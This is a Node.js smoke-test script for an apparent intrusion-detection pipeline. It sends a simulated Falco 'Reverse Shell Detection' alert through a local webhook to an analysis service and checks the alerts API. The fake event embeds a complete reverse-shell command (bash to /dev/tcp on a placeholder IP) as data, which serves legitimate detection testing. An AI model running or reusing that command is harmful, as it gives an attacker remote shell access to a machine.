#!/usr/bin/env node

import { spawn } from "node:child_process";
import { existsSync, writeFileSync, mkdtempSync, rmSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";
import http from "node:http";

const __dirname = dirname(fileURLToPath(import.meta.url));
const root = join(__dirname, "..");

const ANALYSIS_PORT = 18180;
const WEBHOOK_PORT = 28081;
const ANALYSIS_BIN = join(root, "bin", "analysis");

let passed = 0, failed = 0;

function ok(msg) { console.log(`  ✓ ${msg}`); passed++; }
function nok(msg) { console.log(`  ✗ ${msg}`); failed++; }

function waitForPort(host, port, timeoutMs = 10000) {
  const start = Date.now();
  return new Promise((resolve) => {
    function check() {
      const sock = new http.Agent().createConnection({ host, port }, () => {
        sock.destroy();
        resolve(true);
      });
      sock.on("error", () => {
        sock.destroy();
        if (Date.now() - start > timeoutMs) resolve(false);
        else setTimeout(check, 200);
      });
    }
    check();
  });
}

function httpPost(url, body) {
  return new Promise((resolve) => {
    const req = http.request(url, { method: "POST", headers: { "Content-Type": "application/json" } }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => resolve({ status: res.statusCode, body: data }));
    });
    req.on("error", (err) => resolve({ status: 0, error: err.message }));
    req.write(JSON.stringify(body));
    req.end();
  });
}

function httpGet(url) {
  return new Promise((resolve) => {
    http.get(url, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch { resolve({ status: res.statusCode, body: data }); }
      });
    }).on("error", (err) => resolve({ status: 0, error: err.message }));
  });
}

function fakeFalcoEvent(rule) {
  return {
    hostname: "smoke-test-host",
    rule: rule || "Reverse Shell Detection",
    priority: "Critical",
    time: new Date().toISOString(),
    tags: ["kernelharbor", "mitre_execution"],
    output: "Reverse shell detected",
    output_fields: {
      "evt.type": "execve",
      "proc.cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
      "proc.exe": "/usr/bin/bash",
      "proc.pid": 9999,
      "proc.ppid": 1,
      "user.name": "root",
    },
  };
}

async function run() {
  console.log("KernelHarbor Pipeline Smoke Test");
  console.log("================================");

  if (!existsSync(ANALYSIS_BIN)) {
    console.log("\n✗ Analysis binary not found. Run setup first: ./cli/setup.mjs");
    process.exit(1);
  }

  let analysisProc;
  let webhookSrv;
  const tmpDir = mkdtempSync(join(tmpdir(), "kh-smoke-"));

  try {
    console.log("\n1. Starting analysis on :" + ANALYSIS_PORT + "...");
    analysisProc = spawn(ANALYSIS_BIN, [], {
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        HTTP_ADDRESS: `127.0.0.1:${ANALYSIS_PORT}`,
        GRPC_ADDRESS: `127.0.0.1:${ANALYSIS_PORT + 1000}`,
        PROTOCOL: "http",
        LLM_BACKEND: "none",
      },
    });
    analysisProc.stdout.on("data", () => {});
    analysisProc.stderr.on("data", () => {});

    const analysisReady = await waitForPort("127.0.0.1", ANALYSIS_PORT);
    if (!analysisReady) { console.log("  ✗ Analysis failed to start"); process.exit(1); }
    ok("Analysis started");

    console.log("\n2. Starting webhook server on :" + WEBHOOK_PORT + "...");
    let receivedEvents = [];
    webhookSrv = http.createServer((req, res) => {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", () => {
        try {
          const falcoEvent = JSON.parse(body);
          if (falcoEvent.tags && falcoEvent.tags.includes("kernelharbor")) {
            const of = falcoEvent.output_fields || {};
            const event = {
              "@timestamp": falcoEvent.time || new Date().toISOString(),
              "host.name": falcoEvent.hostname || "unknown",
              "event.type": of["evt.type"] || "execve",
              "command.line": of["proc.cmdline"] || "",
              "image.path": of["proc.exe"] || "",
              "process.pid": parseInt(of["proc.pid"]) || 0,
              "user.name": of["user.name"] || "",
              metadata: { falco_rule: falcoEvent.rule || "" },
            };
            receivedEvents.push(event);
            httpPost(`http://127.0.0.1:${ANALYSIS_PORT}/ingest`, event).catch(() => {});
          }
        } catch {}
        res.writeHead(200);
        res.end(JSON.stringify({ status: "ok" }));
      });
    });
    webhookSrv.listen(WEBHOOK_PORT);
    ok("Webhook server started");

    console.log("\n3. Sending simulated falcosidekick webhook...");
    const payload = fakeFalcoEvent();
    const webhookRes = await httpPost(`http://127.0.0.1:${WEBHOOK_PORT}/falco/event`, payload);
    if (webhookRes.status === 200) ok("Webhook accepted (HTTP 200)");
    else { nok("Webhook returned " + webhookRes.status); }

    await new Promise((r) => setTimeout(r, 1500));

    console.log("\n4. Verifying event reached analysis...");
    const alertsRes = await httpGet(`http://127.0.0.1:${ANALYSIS_PORT}/api/alerts?since=1h&min_verdict=benign&limit=10`);
    if (alertsRes.status === 200) {
      ok("GET /api/alerts returned 200");
      const alerts = alertsRes.body.alerts || [];
      if (alerts.length > 0) {
        ok(`Analysis has ${alerts.length} alert(s) from pipeline`);
        const matches = alerts.filter((a) => a["host.name"] === "smoke-test-host");
        if (matches.length > 0) {
          ok("Alert matches our test event (host.name = smoke-test-host)");
        } else {
          nok("No alert matches our test host");
        }
      } else {
        nok("No alerts found — pipeline may not be working");
      }
    } else {
      nok("GET /api/alerts status: " + alertsRes.status);
    }

    console.log("\n5. Pipeline health endpoints...");
    const healthRes = await httpGet(`http://127.0.0.1:${ANALYSIS_PORT}/health`);
    ok(healthRes.status === 200 ? "GET /health OK" : "GET /health failed");

    const statsRes = await httpGet(`http://127.0.0.1:${ANALYSIS_PORT}/api/alerts/stats`);
    ok(statsRes.status === 200 ? "GET /api/alerts/stats OK" : "GET /api/alerts/stats failed");

  } finally {
    if (analysisProc) { analysisProc.kill("SIGTERM"); setTimeout(() => { try { analysisProc.kill("SIGKILL"); } catch {} }, 500); }
    if (webhookSrv) { try { webhookSrv.close(); } catch {} }
    try { rmSync(tmpDir, { recursive: true, force: true }); } catch {}
  }

  const total = passed + failed;
  console.log(`\n==============================`);
  console.log(`Results: ${passed}/${total} passed, ${failed}/${total} failed`);
  process.exit(failed > 0 ? 1 : 0);
}

run().catch((e) => { console.error("Fatal:", e); process.exit(1); });
